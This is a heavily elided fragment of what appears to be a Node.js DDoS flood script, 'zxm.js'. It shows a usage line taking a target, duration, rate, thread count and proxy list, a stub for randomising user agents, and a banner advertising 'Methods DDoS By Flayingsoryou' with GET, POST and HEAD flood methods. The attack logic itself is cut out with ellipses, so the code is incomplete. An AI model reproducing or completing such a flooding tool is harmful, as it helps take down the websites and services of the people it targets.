...
function getRandomUserAgent() {
 ...
 if (process.argv.length < 7){console.log(`node zxm.js target time rate thread proxy.txt`); process.exit();}
...
console.log(`------------------------------------------`)
console.log(`Header Method GET+HTTP+POST+HEAD`)
console.log(`------------------------------------------`)
console.log(`Methods: ZXM`)
console.log(`Methods DDoS By Flayingsoryou`)
console.log(`------------------------------------------`)
